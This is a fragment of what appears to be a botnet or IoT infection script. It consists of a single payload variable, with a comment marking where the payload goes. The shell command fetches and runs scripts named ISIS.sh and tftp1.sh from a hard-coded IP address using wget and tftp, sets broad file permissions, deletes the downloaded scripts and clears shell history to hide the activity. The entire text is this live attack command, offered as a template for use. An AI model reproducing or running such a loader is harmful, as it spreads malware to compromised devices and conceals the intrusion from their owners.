...
cmd="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.173.148.169/ISIS.sh; chmod 777 *; sh ISIS.sh; tftp -g 107.173.148.169 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c" #Payload Goes Here, Example: Payload Goes In Between The ---> ""
